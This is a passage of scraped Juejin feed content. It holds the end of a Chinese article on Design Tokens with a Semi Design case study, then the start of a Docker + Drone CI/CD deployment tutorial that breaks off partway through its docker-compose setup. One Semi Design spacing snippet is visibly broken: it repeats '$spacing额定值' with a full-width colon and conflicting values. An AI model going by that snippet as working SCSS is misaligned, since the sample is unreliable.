<p><strong>保持Token的最小化和可组合性</strong>：Design Tokens应当尽可能基础和原子化，便于组合和复用  。例如，定义基础颜色Token而非具体的组件颜色Token，这样可以在不同组件中灵活组合使用。</p>
<p><strong>提供完善的文档和示例</strong>：良好的文档是Design Tokens成功实施的关键  。应当为每个Token提供详细的文档，包括用途、值、应用场景和示例等。同时，应当提供UI组件库的示例，展示Token如何应用到实际组件中。</p>
<p><strong>实施版本控制和变更管理</strong>：Design Tokens应当采用版本控制，确保变更可以追溯和回滚  。同时，应当建立变更管理流程，确保重要变更经过评审和测试。例如，可以使用GitHub管理Token仓库，通过Pull Request进行变更评审。</p>
<p><strong>支持动态主题和多品牌场景</strong>：Design Tokens应当设计为支持动态主题和多品牌场景，通过条件赋值实现不同主题和品牌的切换  。例如，可以定义明暗模式下的不同Token值，或为不同品牌定义特定的Token扩展层  。</p>
<h3 data-id="heading-5">六、Design Tokens的挑战与解决方案</h3>
<p>尽管Design Tokens带来了诸多好处，但在实施过程中也面临一些挑战。</p>
<p><strong>Token数量爆炸</strong>：随着设计系统的扩展，Token数量可能会迅速增加，导致管理困难。<strong>解决方案是采用分层结构和命名空间</strong>，将Token按照分类、场景和状态进行组织，避免命名冲突和混乱  。例如，使用<code>color-button-</code>作为按钮颜色的命名空间，所有按钮相关的颜色Token都使用这一前缀。</p>
<p><strong>设计与开发的术语差异</strong>：设计师和开发人员可能使用不同的术语描述相同的视觉元素，导致沟通障碍。<strong>解决方案是建立统一的术语表和命名规则</strong>  ，确保双方使用相同的术语和命名方式。例如，设计师可能称为"主色"，而开发人员可能称为"primary-color"，应当统一为"color-brand-default"。</p>
<p><strong>多平台一致性维护</strong>：在跨平台应用中，不同平台可能有不同的实现方式，导致Token值难以统一。<strong>解决方案是采用抽象层和适配器模式</strong>，将平台特定的实现细节隐藏在抽象层后面，确保Token在不同平台上的表现一致  。例如，可以定义<code>shadow-low</code>作为抽象Token，然后在不同平台中实现为特定的阴影效果。</p>
<p><strong>旧系统迁移困难</strong>：对于已有设计系统，迁移到Design Tokens可能面临兼容性和一致性问题。<strong>解决方案是采用渐进式迁移策略</strong>  ，逐步替换旧系统中的样式定义，同时保持向后兼容。例如，可以创建旧系统与新Token的映射表，确保现有组件在迁移过程中不会出现样式偏差。</p>
<p><strong>团队协作阻力</strong>：在大型团队中，设计和开发人员可能对Token的使用有不同意见，导致协作困难。<strong>解决方案是建立明确的治理框架和决策流程</strong>  ，确保Token的定义和使用有明确的规则和责任人。例如，可以设立Token治理委员会，负责Token的定义、审核和更新。</p>
<h3 data-id="heading-6">七、实际案例分析：Semi Design的Token实现</h3>
<p>Semi Design是一个典型的采用Design Tokens的设计系统，它提供了超过2800个设计Token，覆盖了颜色、字体、间距、尺寸等多个方面  。<strong>Semi Design的Token实现展示了如何通过分层结构和抽象化设计实现高度一致性和可扩展性</strong>  。</p>
<p>Semi Design的颜色系统采用了16个色相，每个色相包含10个明度等级，形成一个完整的色盘  。例如红色系列从<code>--semi-red-0</code>（浅红色）到<code>--semi-red-9</code>（深红色），覆盖了不同明度的需求。同时，Semi Design定义了功能颜色Token，如<code>color-primary</code>（主色）、<code>color-error</code>（错误色）等，这些Token可以基于色相-明度Token进行定义，实现灵活的调整和更新。</p>
<p>Semi Design的排版系统预设了从12px到32px的完整字号体系，以及轻（200）、常规（400）、粗（600）三种字重  。例如：</p>
<pre><code class="hljs language-css" lang="css">$<span class="hljs-attribute">font-size</span>-small : <span class="hljs-number">12px</span>;       // 辅助文本
$<span class="hljs-attribute">font-size</span>-regular : <span class="hljs-number">14px</span>;     // 正文
$<span class="hljs-attribute">font-size</span>-<span class="hljs-selector-tag">header</span>-<span class="hljs-number">6</span> : <span class="hljs-number">16px</span>;    // 小标题
$<span class="hljs-attribute">font-weight</span>-bold : <span class="hljs-number">600</span>;       // 强调文本
</code></pre>
<p>间距与尺寸系统则提供了从2px到40px的标准化间距  ：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$spacing</span>额定值：<span class="hljs-number">4</span>px;    <span class="hljs-comment">// 紧凑内边距</span>
<span class="hljs-variable">$spacing</span>额定值：<span class="hljs-number">16</span>px;          <span class="hljs-comment">// 默认间距</span>
<span class="hljs-variable">$height</span>-control-<span class="hljs-keyword">default</span> : <span class="hljs-number">32</span>px;  <span class="hljs-comment">// 按钮/输入框默认高度</span>
</code></pre>
<p>特殊Token如z-index层级系统确保了弹窗组件的正确显示  ：</p>
<pre><code class="hljs language-perl" lang="perl">$z-modal : <span class="hljs-number">1000</span>;        <span class="hljs-regexp">//</span> 模态框层级
$z-tooltip : <span class="hljs-number">1060</span>;      <span class="hljs-regexp">//</span> 提示框层级（高于模态框）
</code></pre>
<p>Semi Design的Token实现还支持动态主题切换，通过覆盖变量的方式实现明暗模式的切换：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 更改主色调为企业蓝</span>
--semi-color-primary : <span class="hljs-number">0</span>, <span class="hljs-number">149</span>, <span class="hljs-number">238</span>;

<span class="hljs-comment">// 增大按钮高度</span>
$height-control-<span class="hljs-keyword">default</span> : <span class="hljs-number">36</span>px;
</code></pre>
<p>通过ConfigProvider应用自定义主题：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ConfigProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@douyinfe/semi-ui'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'./custom-theme.scss'</span>;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ConfigProvider</span> <span class="hljs-attr">themeMode</span>=<span class="hljs-string">"dark"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ConfigProvider</span>&gt;</span></span>;
</code></pre>
<p>Semi Design的Token实现展示了如何通过分层结构和抽象化设计实现高度一致性和可扩展性，为设计系统提供了良好的参考。</p>
<h3 data-id="heading-7">八、未来趋势与发展方向</h3>
<p>Design Tokens技术仍在不断发展和完善，未来可能会出现以下趋势：</p>
<p><strong>AI辅助Token管理</strong>：随着AI技术的发展，未来可能会出现AI辅助的Token管理系统，能够自动识别设计中的视觉元素并生成对应的Token，或根据用户反馈自动调整Token值，提高设计效率和用户体验。</p>
<p><strong>跨平台Token标准</strong>：目前各平台和框架的Token实现各不相同，未来可能会出现跨平台的Token标准，使设计Token能够在不同平台和框架之间无缝转换和使用，提高跨平台应用的一致性和开发效率。</p>
<p><strong>动态Token系统</strong>：未来的Design Tokens可能会更加动态，能够根据用户偏好、环境条件或业务需求自动调整Token值，实现更加个性化和自适应的用户体验。</p>
<p><strong>Token与设计原则的结合</strong>：Design Tokens可能会与设计原则（如一致性、简洁性、可访问性等）更加紧密地结合，通过Token的定义和使用直接体现设计原则，确保设计系统符合产品定位和用户体验目标  。</p>
<p><strong>Token与组件的深度集成</strong>：未来的组件库可能会更加深度集成Design Tokens，使Token的修改能够直接影响组件的外观和行为，实现更加灵活和可定制的设计系统。</p>
<h3 data-id="heading-8">九、总结与建议</h3>
<p><strong>Design Tokens是现代设计系统的核心技术，通过将视觉设计元素抽象为可管理的变量，实现了设计与开发的无缝协作和一致的用户体验</strong>  。它们不仅提高了工作效率，还降低了维护成本，支持了动态主题和多品牌场景。</p>
<p>对于希望实施Design Tokens的团队，建议从以下几个方面入手：</p>
<p>首先，<strong>建立跨职能团队</strong>，确保设计、开发和产品团队共同参与Design Tokens的设计和实施，形成统一的理解和规范  。</p>
<p>其次，<strong>采用渐进式实施策略</strong>，先从核心组件和高频使用的设计元素开始，逐步扩展到整个设计系统，避免一次性实施带来的复杂性和阻力  。</p>
<p>第三，<strong>建立完善的命名规则和分类体系</strong>，确保Token的语义化、一致性和可读性，为团队协作和长期维护奠定基础  。</p>
<p>最后，<strong>利用工具链简化实施过程</strong>，选择适合团队的设计工具、转换工具和开发框架，提高实施效率和质量。</p>
<p>通过合理设计和实施Design Tokens，团队可以建立更加高效、一致和可维护的设计系统，为产品的长期发展和用户体验提升提供有力支持。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别手动部署！Docker + Drone 前端自动化部署指南]]></title>    <link>https://juejin.cn/post/7575413146922876943</link>    <guid>https://juejin.cn/post/7575413146922876943</guid>    <pubDate>2025-11-24T02:56:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575413146922876943" data-draft-id="7574671792997482531" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别手动部署！Docker + Drone  前端自动化部署指南"/> <meta itemprop="keywords" content="前端,CI/CD,Docker"/> <meta itemprop="datePublished" content="2025-11-24T02:56:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="西维"/> <meta itemprop="url" content="https://juejin.cn/user/1372654389433496"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别手动部署！Docker + Drone  前端自动化部署指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1372654389433496/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    西维
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:56:53.000Z" title="Mon Nov 24 2025 02:56:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;position:relative;background-image:linear-gradient(90deg,rgba(217,234,251,.25) 3%,transparent 0),linear-gradient(1turn,rgba(217,234,251,.25) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;padding-left:8px;padding-bottom:0;margin-top:35px;margin-bottom:10px;font-weight:900;font-family:serif;letter-spacing:1px;color:#000}.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover{background-color:#fff}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;position:relative}.markdown-body h2:after{content:"";left:0;bottom:0;width:100%;height:1px;position:absolute}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{height:1px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#37b2ff 0,#37b2ff 25%,transparent 50%)}.markdown-body code{margin:0 4px;word-break:break-word;overflow-x:auto;background-color:#fff7f7;color:#f06;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:-apple-system,system-ui,Menlo,Monaco,Consolas,Courier New;position:relative}.markdown-body pre{margin:15px 8px;border:1px solid #f5f5f7;line-height:1.75}.markdown-body pre:before{top:-4px;left:-4px;border-top:8px solid #feea1e;border-left:8px solid #feea1e}.markdown-body pre:after,.markdown-body pre:before{width:20px;height:20px;content:"";z-index:10;position:absolute}.markdown-body pre:after{right:-4px;bottom:-4px;border-right:8px solid #37b2ff;border-bottom:8px solid #37b2ff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;overflow-x:auto;margin:0;word-break:normal;display:block;color:#333;background-color:#fff;position:unset!important}.markdown-body pre:nth-child(odd):before{border-top-color:#a7ecad;border-left-color:#a7ecad}.markdown-body pre:nth-child(odd):after{border-right-color:#e699e6;border-bottom-color:#e699e6}.markdown-body a{margin:0 4px;text-decoration:none;color:#37b2ff;transition:.3s;display:inline-block;vertical-align:bottom;position:relative}.markdown-body a:before{content:"READ MORE +";bottom:90%;width:120px;max-width:0;color:#fff;background-color:#1fb3ff;position:absolute;white-space:nowrap;transition:.3s;box-sizing:border-box;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";bottom:0;left:0;width:100%;height:1px;border-bottom:1px dashed #37b2ff;position:absolute}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:120px;padding-left:14px}.markdown-body table{width:100%;max-width:100%;font-size:12px;background-color:#fff;overflow:auto;border-collapse:collapse}.markdown-body table tr:hover td,.markdown-body table tr:hover th{border-bottom:1px solid #feea1e}.markdown-body thead{text-align:left}.markdown-body th{font-size:1.2em;border-bottom:1px dashed #eee}.markdown-body tr:nth-child(2n){background-color:hsla(0,0%,87.8%,.1);border-bottom:1px solid #fff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px;border-bottom:1px dashed #fff}.markdown-body blockquote{color:#666;padding:12px 23px 2px;border:1px solid #37b2ff;background-color:#fff;margin:22px 0;position:relative}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body blockquote:after{content:"FROM";left:0;width:40px;color:#fff;background-color:#37b2ff;text-align:center}.markdown-body blockquote:after,.markdown-body blockquote:before{top:0;line-height:1;padding:2px 0;font-size:12px;font-weight:lighter;position:absolute;pointer-events:none}.markdown-body blockquote:before{content:"CITATION";left:44px;color:#37b2ff}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{line-height:2em;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#37b2ff}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol ol li,.markdown-body ol ul li,.markdown-body ul ol li,.markdown-body ul ul li{border-bottom:none}.markdown-body ol li{padding-left:6px;list-style:decimal-leading-zero}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]{position:relative}.markdown-body input[type=checkbox]:before{top:0;left:0;right:0;bottom:0;content:"";width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1;position:absolute}.markdown-body input[type=checkbox]:checked:after{content:"";top:10%;left:18%;width:90%;height:40%;border-left:2px solid #37b2ff;border-bottom:2px solid #37b2ff;color:#37b2ff;z-index:2;transform:rotate(-45deg);position:absolute}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p>但行好事，莫问前程</p>
</blockquote>
<h2 data-id="heading-0">前言</h2>
<p>本文不只是配置文件的堆砌，也解释是什么和为什么，希望大家能耐心学习😽。</p>
<p>现在的项目大多通过各种 <strong><code>CI/CD工具</code></strong>（例如著名的 <code>Jenkins</code>、 <code>gitLab</code>，github推出的 <code>github actions</code>）来进行 <strong>自动化部署</strong>。</p>
<p>它们已成为市场主流，是项目基建中不可或缺的一环。</p>
<p>开发人员只需开发完成后，一个代码推送/合并，项目便会自动部署到服务器上运行，呈现给用户。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a79b8131aba479eafd980194cea7620~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=r5GUEKRNpdmTh7BIrY06qiNJojI%3D" alt="dronev.gif" loading="lazy"/></p>
<blockquote>
<p><strong>持续部署（Continuous Deployment，CD）：</strong></p>
<ul>
<li>指自动化部署已通过测试的代码到生产环境，以实现快速、可靠的软件交付。</li>
<li>CD 流程包括自动化构建部署流程、自动化测试、环境配置管理等步骤，以确保部署的软件质量和稳定性。</li>
<li>目的是缩短软件交付周期，降低部署风险，提高部署的可重复性和一致性</li>
</ul>
</blockquote>
<p>相比于古早缓慢且充满风险的手动部署，它们能将项目 <strong>自动化的构建、测试和部署到线上环境以实现交付的高质量和效率</strong>。</p>
<p>无论你是什么方向的开发者，学习+使用它们都是一个极具性价比的选择。</p>
<p>接下来我们一起搭建自动化部署平台，如果对你有所帮助，<strong>还望点赞、收藏、关注三连😽。</strong></p>
<h2 data-id="heading-1">简介</h2>
<p>本文要分享的是后起之秀 <strong><code>Drone</code></strong>，它免费、轻量、简洁、支持私有化，更重要的是它的 <strong><code>yaml写法</code></strong> 和 <strong><code>pipeline流水线</code></strong> 非常适合对运维陌生的同学去理解相关流程。</p>
<blockquote>
<p>如果对 linux 和 docker 不熟悉的同学需要先简单了解相关知识，本文使用 docker compose 来编排容器。</p>
</blockquote>
<p><strong><code>Drone</code></strong> 深度集成了多个 SCM 网站，包括 GitHub、GitLab、Gitee等。它的每个构建都在一个隔离的 Docker 容器中运行；另外它也支持插件，可以使用你熟知的语言轻松的扩展它们。</p>
<p>当前一切都部署好后，只需在代码仓库目录下添加一个描述文件 <strong><code>.drone.yml</code></strong>，就可以完成 CI/CD 配置。</p>
<p><strong><code>Drone</code></strong> 需要创建两个容器</p>
<ul>
<li><strong><code>Server</code></strong>: 负责任务调度、提供视图、用户权限配置 . . .</li>
<li><strong><code>Runner</code></strong>: 执行 Pipeline 具体任务、创建隔离的容器环境、上报日志和状态 . . .</li>
</ul>
<h2 data-id="heading-2">流程 &amp; 文档</h2>
<p>我使用的服务器：4核4G - CentOS - 40G SSD （其实2核2G即可，Drone资源占用很少）</p>
<p><strong>搭建自动化部署的流程如下</strong>：</p>
<ol>
<li>配置 <code>Github - OAuth Application</code></li>
<li>安装、配置 <code>Docker</code>、<code>Drone Server</code>、<code>Drone Runner</code></li>
<li>编写 <code>docker-compose.yml</code> 编排容器，用于管理 <code>Drone Server</code>、<code>Drone Runner</code></li>
<li>了解 <code>pipeline</code>，了解常用插件，在代码仓库中加入 <code>.drone.yml</code></li>
<li>推送代码测试打包效果</li>
</ol>
<p><strong>相关文档</strong>：</p>
<p>drone server 服务端 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.drone.io%2Fserver%2Foverview%2F" target="_blank" title="https://docs.drone.io/server/overview/" ref="nofollow noopener noreferrer">docs.drone.io/server/over…</a></p>
<p>drone runer linux <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.drone.io%2Frunner%2Fdocker%2Finstallation%2Flinux%2F" target="_blank" title="https://docs.drone.io/runner/docker/installation/linux/" ref="nofollow noopener noreferrer">docs.drone.io/runner/dock…</a></p>
<p>drone pieline 配置 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.drone.io%2Fpipeline%2Foverview%2F" target="_blank" title="https://docs.drone.io/pipeline/overview/" ref="nofollow noopener noreferrer">docs.drone.io/pipeline/ov…</a></p>
<p>drone plugins <a href="https://link.juejin.cn?target=https%3A%2F%2Fplugins.drone.io%2F" target="_blank" title="https://plugins.drone.io/" ref="nofollow noopener noreferrer">plugins.drone.io/</a></p>
<p><strong>常用指令</strong>:</p>
<p><code>docker compose down &lt;image-name&gt;</code> 关闭指定容器（不指定则默认所有）</p>
<p><code>docker compose up -d &lt;image-name&gt;</code> 启动指定容器（不指定则默认所有）</p>
<p><code>docker compose logs -f &lt;image-name&gt;</code> 打印容器的日志</p>
<p><code>docker compose exec &lt;image-name&gt; bash</code> 进入指定容器的shell</p>
<p><code>docker ps</code> 查看正在运行的容器</p>
<p><code>docker images</code> 查看下载的镜像</p>
<p><code>netstat -tulnp</code> 显示进程与占用的端口</p>
<h2 data-id="heading-3">实践</h2>
<h3 data-id="heading-4">Github OAuth</h3>
<p><strong><code>GitHub OAuth</code></strong> 的作用是： <strong>"让用户安全地授权第三方应用代表自己执行特定操作"</strong> 。</p>
<p>在Drone的使用场景中，它提供了：</p>
<ul>
<li><strong>🔐 安全登录</strong> - 不用为Drone单独创建账号</li>
<li><strong>🔄 自动同步</strong> - Drone自动获取你的仓库列表</li>
<li><strong>⚡ 自动触发</strong> - Drone有权限设置webhook，代码推送即触发构建</li>
<li><strong>🎯 权限可控</strong> - 你可以随时在GitHub上撤销Drone的访问权限</li>
</ul>
<h4 data-id="heading-5">配置</h4>
<ol>
<li>
<p><strong>头像 -&gt; Settings -&gt;  Developer settings -&gt; OAuth Apps -&gt; New OAuth App</strong></p>
</li>
<li>
<p>填写项目名</p>
</li>
<li>
<p><strong>HomePage URL</strong> —— Github允许调用登录的URL，我们设置为drone server运行的端口</p>
</li>
<li>
<p><strong>Authorization callback URL</strong> —— 认证成功后的回调网址，在drone里为 url + /login</p>
</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e303ae18cc5d4554bb346a6b6af7f3f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=cnNjpw9HtUrATvjVFnwbRn3TiTE%3D" alt="QQ_1763938534023.png" loading="lazy"/></p>
<ol start="5">
<li>点击 New Secret</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7268310620a4d2bbd289d3db94cf080~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KW_57u0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557813&amp;x-signature=%2BCB7PDe4edyCZ5BRs2bs56fj2uA%3D" alt="QQ_1763939334557.png" loading="lazy"/></p>
<ol start="6">
<li>拿到 <strong><code>Client ID</code></strong> 和 <strong><code>Client Secret</code></strong>，记录下来！后续用于 Drone 的配置</li>
</ol>
<blockquote>
<p>127.0.0.1 只为预设，实际使用时请替换为自己的真实域名 或 IP+端口</p>
</blockquote>
<h3 data-id="heading-6">Docker</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装docker</span>
sudo dnf config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

sudo dnf install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

<span class="hljs-comment"># 启动指令</span>
sudo systemctl start docker
sudo systemctl <span class="hljs-built_in">enable</span> docker

<span class="hljs-comment"># 测试指令</span>
sudo docker run hello-world

<span class="hljs-comment"># 配置镜像加速 + 重启服务 </span>
sudo <span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="hljs-string">'EOF'</span>
{
  <span class="hljs-string">"registry-mirrors"</span>: [
    <span class="hljs-string">"https://registry.docker-cn.com"</span>,
    <span class="hljs-string">"https://docker.mirrors.ustc.edu.cn"</span>,
    <span class="hljs-string">"https://hub-mirror.c.163.com"</span>
  ]
}
EOF

<span class="hljs-comment"># 重启服务</span>
sudo systemctl restart docker

</code></pre>
<p>镜像加速部分，个人服务器访问 "<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocker.1ms.run" target="_blank" title="https://docker.1ms.run" ref="nofollow noopener noreferrer">docker.1ms.run</a>" 最快，大家结合自身情况配置</p>
<h4 data-id="heading-7">Docker Compose</h4>
<p><strong><code>Docker Compose</code></strong> 可以<code>定义和运行多个 Docker 容器</code>应用的工具。它允许你使用一个单独的文件（通常称为 docker-compose.yml）来配置应用程序的服务，然后使用该文件快速启动整个应用的所有服务。</p>
<h3 data-id="heading-8">Drone</h3>
<p>使用docker安装drone的两个容器，Server端 - 控制调度和提供视图，Runner 端 - 执行流水线和上报状态</p>
<pre><code class="hljs language-bash" lang="bash">docker pull drone/drone:latest 
docker pull drone/drone-runner-docker:latest
</code></pre>
<p>同时创建一个共享密钥，用于  Server 和  Runner 之间的通信认证，使用此密钥填充环境变量 <code>DRONE_RPC_SECRET</code></p>
<pre><code class="hljs language-bash" lang="bash">openssl rand -hex 16
c1da0391axxxxxxxxxxxxxxxxx
</code></pre>
<h4 data-id="heading-9">drone-server</h4>
<p><code>/opt/docker/docker-compose.yml</code></p>
<pre><code class="hljs language-yml" lang="yml"><span class="hljs-attr">services:</span>
  <span class="hljs-comment"># drone 服务端</span>
  <span class="hljs-attr">drone-server:</span> 
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">drone-server</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">drone/drone:latest</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>
    <span class="hljs-attr">ports:</span>
      <span class="hljs-comment">#  端口映射</span>
      <span class="hljs-bullet">-</span> <span class="hljs-number">8082</span><span class="hljs-string">:80</span>  
      <span class="hljs-bullet">-</span> <span class="hljs-number">4443</span><span class="hljs-string">:443</span>

    <span class="hljs-attr">volumes:</span>
      <span class="hljs-comment"># 挂载数据目录，持久化 Drone 的配置信息和数据库</span>
	<span class="hljs-comment"># 容器 /data 目录 -&gt; 宿主机当前 ./drone-data 目录</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./drone-data:/data</span>

    <span class="hljs-attr">environment:</span>
      <span class="hljs-comment"># Git OAuth - Client ID</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_GITHUB_CLIENT_ID=Ov23lxxxxxxxxx</span>
      <span class="hljs-comment"># Git OAuth - Client Secret</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_GITHUB_CLIENT_SECRET=d60645938xxxxxxxxxxxxxxxxxxxxx</span>
      <span class="hljs-comment"># Drone Server 和 Runner 之间的 RPC 认证密钥，需保持一致</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_SECRET=c1da0391axxxxxxxxxxxxxxxxx</span>
      <span class="hljs-comment"># Drone Server的公网地址</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_SERVER_HOST=&lt;服务器的公网IP&gt;:&lt;端口&gt;</span>
      <span class="hljs-comment"># 通信协议</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_SERVER_PROTO=http</span>
      <span class="hljs-comment"># 创建管理员账户</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_USER_CREATE=username:XiwE1,admin:true</span>
</code></pre>
<ul>
<li>
<p><strong>ports</strong> - 为宿主机与容器的端口映射</p>
</li>
<li>
<p><strong>DRONE_GITHUB_CLIENT_ID</strong> 和 <strong>DRONE_GITHUB_CLIENT_SECRET</strong></p>
<ul>
